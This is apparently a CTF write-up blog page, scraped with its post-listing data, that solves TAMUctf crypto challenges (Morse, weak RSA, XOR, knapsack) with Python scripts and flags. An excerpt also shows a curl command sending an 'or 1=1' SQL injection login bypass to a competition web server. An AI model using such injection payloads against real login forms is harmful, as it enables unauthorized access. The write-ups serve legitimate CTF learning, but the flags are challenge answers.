dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit solve.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import re def morse(s): morseChart = [\u0026#39;.-\u0026#39;, \u0026#39;-...\u0026#39;, \u0026#39;-.-.\u0026#39;, \u0026#39;-..\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;..-.\u0026#39;, \u0026#39;--.\u0026#39;, \u0026#39;....\u0026#39;, \u0026#39;..\u0026#39;, \u0026#39;.---\u0026#39;, \u0026#39;-.-\u0026#39;, \u0026#39;.-..\u0026#39;, \u0026#39;--\u0026#39;, \u0026#39;-.\u0026#39;, \u0026#39;---\u0026#39;, \u0026#39;.--.\u0026#39;, \u0026#39;--.-\u0026#39;, \u0026#39;.-.\u0026#39;, \u0026#39;...\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;..-\u0026#39;, \u0026#39;...-\u0026#39;, \u0026#39;.--\u0026#39;, \u0026#39;-..-\u0026#39;, \u0026#39;-.--\u0026#39;, \u0026#39;--..\u0026#39;, \u0026#39;-----\u0026#39;, \u0026#39;.----\u0026#39;, \u0026#39;..---\u0026#39;, \u0026#39;...--\u0026#39;, \u0026#39;....-\u0026#39;, \u0026#39;.....\u0026#39;, \u0026#39;-....\u0026#39;, \u0026#39;--...\u0026#39;, \u0026#39;---..\u0026#39;, \u0026#39;----.\u0026#39;, \u0026#39;.-.-.-\u0026#39;, \u0026#39;--..--\u0026#39;, \u0026#39;..--..\u0026#39;, \u0026#39;-....-\u0026#39;, \u0026#39;.----.\u0026#39;, \u0026#39;---...\u0026#39;, \u0026#39;.-..-.\u0026#39;, \u0026#39;-..-.\u0026#39;, \u0026#39;.--.-.\u0026#39;, \u0026#39;-.-.-.\u0026#39;, \u0026#39;-...-\u0026#39;, \u0026#39;-.-.--\u0026#39;, \u0026#39;..--.-\u0026#39;, \u0026#39;-.--.\u0026#39;, \u0026#39;-.--.-\u0026#39;, \u0026#39;...-..-\u0026#39;, \u0026#39;.-...\u0026#39;, \u0026#39;.-.-.\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;*\u0026#39; ] alphaChart = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;w\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;z\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;-\u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;:\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;@\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;#\u0026#39; ] # or as a dict -\u0026gt; {c[1][i]: c[0][i] for i in xrange(len(c[0]))} c = [morseChart, alphaChart] s = s.lower() # replace characters not in alphaChart with \u0026#39;#\u0026#39; ,which shall be \u0026#39;*\u0026#39; in # encoded string s = re.sub(\u0026#39;[^a-z0-9.,?\\-\\\u0026#39;:\u0026#34;/@;=!_()$\u0026amp;+ ]\u0026#39;, \u0026#39;#\u0026#39;, s) # for convenience sake, I choose not to deal with space in morse. s = re.sub(\u0026#39;\\s+\u0026#39;, \u0026#39; \u0026#39;, s) m = 1 # default to decode # if mot mismatch that condition,we are to encode. if not re.match(\u0026#39;[^-._ ]\u0026#39;, s): # occasionally we meet [ ._]+ instead of [ .-]+ s = s.replace(\u0026#39;_\u0026#39;, \u0026#39;-\u0026#39;) s = re.split(\u0026#39; \u0026#39;, s) m = 0 # we are to encode by morse r = [] # list().extend(foo) returns None so we use \u0026#39;or r\u0026#39; return (m * \u0026#39; \u0026#39;).join(r.extend([c[1 - m][c[m].index(i)] for i in s]) or r) cipher=\u0026#34;dah-dah-dah-dah-dah dah-di-di-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dit dah-di-di-di-dit dah-di-dit di-di-di-di-dah dah-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dah-dah di-dah dah-dah-di-di-dit di-di-di-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit di-dah di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dah-dah di-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah dah-di-di-di-dit di-di-di-di-dah di-dah dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-dah dah-di-di-di-dit dah-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dit di-di-di-di-dah dit di-di-di-dah-dah dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit di-di-dah-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dit di-dah di-di-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-dah di-di-di-di-dah dah-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dah-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-di-di-di-dit dah-di-dah-dit di-di-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dah di-di-di-di-dah dah-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit dah-di-dit dah-dah-di-di-dit dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit\u0026#34; cipher=cipher.replace(\u0026#39;-\u0026#39;,\u0026#39;\u0026#39;).replace(\u0026#39;dit\u0026#39;,\u0026#39;.\u0026#39;).replace(\u0026#39;di\u0026#39;,\u0026#39;.\u0026#39;).replace(\u0026#39;dah\u0026#39;,\u0026#39;-\u0026#39;) print morse(cipher) # 0x57702a6c58744751386538716e6d4d59552a737646486b6a49742a5251264a705a766a6d2125254b446b6670235e4e39666b346455346c423372546f5430505a516d4351454b5942345a4d762a21466b386c25626a716c504d6649476d612525467a4720676967656d7b433169634b5f636c31434b2d7930755f683476335f6d3449317d20757634767a4b5a7434796f6d694453684c6d385145466e5574774a404e754f59665826387540476e213125547176305663527a56216a217675757038426a644e49714535772324255634555a4f595a327a37543235743726784c40574f373431305149 # use https://findneo.github.io/kt/tools.html#conv/ to convert hex to string # gigem{C1icK_cl1CK-y0u_h4v3_m4I1} RSAaaay Hey, you\u0026rsquo;re a hacker, right? I think I am too, look at what I made!\n1 (2531257, 43) My super secret message: 906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268\nProblem is, I don\u0026rsquo;t remember how to decrypt it\u0026hellip; could you help me out?\nDifficulty: easy\nsolve.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import gmpy2 n=2531257 e=43 cc=[906851 ,991083 ,1780304 ,2380434 ,438490 ,356019 ,921472 ,822283 ,817856, 556932 ,2102538 ,2501908, 2211404 ,991083 ,1562919 ,38268] p,q=509,4973 assert(p*q==n) phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) assert(e*d%phi==1) mm=\u0026#39;\u0026#39;.join([str(int(pow(c,d,n))) for c in cc]) print mm #103105103101109123839711897103101958310512095701081211051101039584105103101114115125 mm=[103,105,103,101,109,123,83,97,118,97,103,101,95,83,105,120,95,70,108,121,105,110,103,95,84,105,103,101,114,115,125] print \u0026#39;\u0026#39;.join([chr(m) for m in mm]) # gigem{Savage_Six_Flying_Tigers} :) Look at what I found! XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH\nDifficulty: easy\n直接base64解码没有可打印字符。已知flag前几个字符为gigem{，尝试base64解码后内容和gigem逐字节异或得到:):): ，发现规律。\nsolve.py\n1 2 3 4 5 6 7 import base64,itertools data=base64.b64decode(\u0026#34;XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH\u0026#34;) flag_format=\u0026#34;gigem{\u0026#34; print \u0026#39;\u0026#39;.join(chr(ord(a)^ord(b))for a,b in zip(flag_format,data)) # :):):) print(\u0026#39;\u0026#39;.join(chr(ord(a)^ord(b)) for a,b in zip(data, itertools.cycle(\u0026#39;:)\u0026#39;)))) # gigem{I\u0026#39;m not superstitious, but I am a little stitious.} zip和itertools.cycle用法如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 zip(seq1 [, seq2 [...]]) -\u0026gt; [(seq1[0], seq2[0] ...), (...)] param seq1 Return a list of tuples, where each tuple contains the i-th element from each of the argument sequences. The returned list is truncated in length to the length of the shortest argument sequence. ------- cycle(iterable) --\u0026gt; cycle object param iterable Return elements from the iterable until it is exhausted. Then repeat the sequence indefinitely. 另外有一个不错的工具（https://gchq.github.io/CyberChef/#recipe=Magic(3,true,false,'')\u0026amp;input=WFVCZFRGZFNjdzVYQ1ZSR1RnbEpYRXBNU0ZwT1FFNUFWVnhKQlJwTFQxMGFZQnBJVndsYkNWWkFUbDFXVEJwYVRrQk9RRlZjU1FkSA） 可以尝试检查数据可能的格式。\nHoley Knapsack My knapsack has a hole in it\nCipher text: 11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9\nPublic key: {99, 1235, 865, 990, 5, 1443, 895, 1477}\nThe flag is slightly off format.\nDifficulty: medium\n是著名的和RSA同年发布的公钥加密系统 Merkle-Hellman Public Key Cryptosystem ，是Knapsack cryptosystems 之一，已被破解。 参见https://www.nevivur.net/writeups/2019/02/tamuctf-19/#holey-knapsack 。\n解密脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/usr/bin/env python3 pkey = [99, 1235, 865, 990, 5, 1443, 895, 1477] ctext = \u0026#39;11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9\u0026#39; mapping = dict() for c in range(256): enc = 0 for i in range(8): if c\u0026amp;(1\u0026lt;\u0026lt;i): enc += pkey[i] mapping[hex(enc)[2:]] = chr(c) d = \u0026#39;\u0026#39; while ctext: if not d and ctext[0] == \u0026#39;0\u0026#39;: ctext = ctext[1:] d += ctext[0] ctext = ctext[1:] if d in mapping: print mapping[d], d = \u0026#39;\u0026#39; # g i g _ e m { m e r k l e - h e l l m a n - k n a p s a c k } 参考链接 https://ctftime.org/event/740/tasks/ ","permalink":"https://ret2neo.cn/post/190223-tamuctf/","summary":"Web Not Another SQLi Challenge 尝试登陆时页面会发生跳转，可在chrome浏览器开发者工具中的Network栏勾选Preserve log保存报文内容，以便用于burp重放。\n万能密码登录。\n1 2 $curl -s \u0026#34;http://web1.tamuctf.com/web/login.php\u0026#34; -d \u0026#34;username=admin\u0026#39; or 1=1#\u0026amp;password\u0026#34; | grep -o \u0026#34;gigem{.*}\u0026#34; gigem{f4rm3r5_f4rm3r5_w3\u0026#39;r3_4ll_r16h7} Robots Rule 1 2 3 4 5 6 $curl \u0026#34;http://web5.tamuctf.com/robots.txt\u0026#34; User-agent: * WHAT IS UP, MY FELLOW HUMAN! HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?! YOU CAN TELL ME, A FELLOW NOT-A-ROBOT! 按提示伪装成Google机器人访问 robots.txt 。\n1 2 curl \u0026#34;http://web5.tamuctf.com/robots.txt\u0026#34; -A \u0026#34;Googlebot/2.1 (+http://www.google.com/bot.html)\u0026#34; -s | grep -o \u0026#34;gigem{.","title":"TAMUctf writeup"},{"content":"CTF Crypto Crypto1 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flag import flag from Crypto.Util.number import * import random def next_prime(n): num = n + 1 while True: if isPrime(num): return num num += 1 p = random.randint(1\u0026lt;\u0026lt;3071,1\u0026lt;\u0026lt;3072) p = next_prime(p) q = next_prime(p*10) N = p*q e = 65537 c = pow(bytes_to_long(flag),e,N) print N#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 print csolve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ncimport gmpy2 from Crypto.Util.number import * k=gmpy2.iroot(n//10+1,2)[0]+1 print(k) for i in range(0xfffffff): f=k-i if i%10000==0: print(i,end=\u0026#34; \u0026#34;) if n%f==0: print(i,n) break p=f q=n//f assert(p*q==n) phi=(p-1)*(q-1) e= 65537 d=gmpy2.invert(e,phi) m=pow(c,d,n) print(long_to_bytes(m)) # 4971490805710648894784063900603982138103528416416093113682856149525895474391965093292856360186270533203485404384261736770807923420477678768335595268260058770929420214670794184479653642688593773001265441972139034999789321709099375988424776953616924996952770970955016095518058970453801153351600603001621188113472370286189729979231943525793160692844078376540082324198649179890017101800683049489232021392715915700831833371902425005874555370189042455321691195416425399507551235346773377429357933240695935997956969841660473107352934178051894901298644110556291216221039424250078546978571086275993790666829060240691673857284132895978717935677825502362997789971900863003499701755174512295162461514926135376073693593713246781021035797102243028802222257489266812730745381990847604727619717567202686948267842932198278066304365500430012440700948799107940169074390644763691400614036677335457180241108468029814414775113509028739480597728378 # 0 59 